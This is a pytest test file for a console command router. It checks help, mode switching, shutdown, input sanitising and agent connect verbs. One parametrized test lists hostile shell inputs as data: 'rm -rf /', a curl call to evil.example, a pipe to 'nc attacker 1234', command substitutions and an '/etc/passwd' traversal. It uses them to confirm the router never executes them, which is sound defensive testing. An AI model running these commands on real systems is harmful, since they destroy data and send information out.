"""Tests for the console command router.

The security-relevant assertions are that unknown input is never executed and
that hostile input is neutralised rather than passed through.
"""

from __future__ import annotations

import pytest

from javris.commands.router import MAX_COMMAND_LENGTH, CommandRouter, Severity


@pytest.fixture
def router() -> CommandRouter:
    return CommandRouter()


def test_help_lists_every_verb(router: CommandRouter) -> None:
    result = router.dispatch("help")
    assert result.severity is Severity.INFO
    for verb in router.verbs:
        assert verb in result.message


def test_status_reports_ok(router: CommandRouter) -> None:
    assert router.dispatch("status").severity is Severity.OK


def test_mode_switch_returns_requested_mode(router: CommandRouter) -> None:
    result = router.dispatch("mode monitor")
    assert result.severity is Severity.OK
    assert result.mode == "MONITOR"


def test_mode_is_case_insensitive(router: CommandRouter) -> None:
    assert router.dispatch("MODE Diagnostics").mode == "DIAGNOSTICS"


def test_mode_without_argument_explains_usage(router: CommandRouter) -> None:
    result = router.dispatch("mode")
    assert result.severity is Severity.WARN
    assert "usage" in result.message.lower()
    assert result.mode is None


def test_unknown_mode_is_rejected(router: CommandRouter) -> None:
    result = router.dispatch("mode hyperspace")
    assert result.severity is Severity.ERROR
    assert result.mode is None


def test_shutdown_sets_flag(router: CommandRouter) -> None:
    assert router.dispatch("shutdown").shutdown is True


def test_unknown_command_is_rejected_not_executed(router: CommandRouter) -> None:
    result = router.dispatch("rm -rf /")
    assert result.severity is Severity.ERROR
    assert "unknown command" in result.message.lower()
    assert result.shutdown is False
    assert result.mode is None


@pytest.mark.parametrize(
    "hostile",
    [
        "status; rm -rf /",
        "status && curl http://evil.example",
        "status $(whoami)",
        "status `id`",
        "status | nc attacker 1234",
        "../../etc/passwd",
    ],
)
def test_shell_metacharacters_do_not_produce_execution(router: CommandRouter, hostile: str) -> None:
    """Only the first token is ever consulted, and never as a shell string."""
    result = router.dispatch(hostile)
    # Either the verb is unknown, or it is 'status' and the rest is ignored.
    assert result.shutdown is False
    assert result.severity in (Severity.ERROR, Severity.OK)


def test_control_characters_are_stripped(router: CommandRouter) -> None:
    # An ANSI escape and the log delimiter must not survive into the message.
    result = router.dispatch("\x1b[31mstatus\x1f")
    assert "\x1b" not in result.message
    assert "\x1f" not in result.message


def test_empty_and_whitespace_input_is_ignored(router: CommandRouter) -> None:
    for line in ("", "   ", "\t\n"):
        assert router.dispatch(line).severity is Severity.WARN


def test_overlong_input_is_rejected_outright(router: CommandRouter) -> None:
    result = router.dispatch("status" + "a" * MAX_COMMAND_LENGTH)
    assert result.severity is Severity.ERROR
    assert "rejected" in result.message.lower()


def test_dispatch_never_raises(router: CommandRouter) -> None:
    for line in ("", "?", "mode", "mode x y z", "\x00\x01", "help extra args"):
        assert router.dispatch(line) is not None


# -- agent verbs -------------------------------------------------------------


def test_agent_connect_is_a_verb(router: CommandRouter) -> None:
    # Connecting used to be reachable only through a slot nothing called, so
    # the console's own help promised agent verbs that could never work.
    result = router.dispatch("agent connect")
    assert result.severity is Severity.INFO
    assert result.agent_connect is True
    # Connecting is a pure connection act: no tool call rides along with it.
    assert result.agent_tool is None
    assert result.agent_disconnect is False


def test_agent_connect_is_case_insensitive(router: CommandRouter) -> None:
    assert router.dispatch("agent CONNECT").agent_connect is True


def test_agent_status_and_disconnect_are_unchanged(router: CommandRouter) -> None:
    status = router.dispatch("agent status")
    assert status.agent_tool == "jarvis_status"
    assert status.agent_connect is False
    gone = router.dispatch("agent disconnect")
    assert gone.agent_disconnect is True
    assert gone.agent_connect is False


def test_agent_usage_names_every_action(router: CommandRouter) -> None:
    for line in ("agent", "agent teleport"):
        message = router.dispatch(line).message
        for action in ("connect", "status", "disconnect"):
            assert action in message, f"{line!r} usage omits {action!r}"
    assert router.dispatch("agent teleport").severity is Severity.ERROR
    assert router.dispatch("agent teleport").agent_connect is False
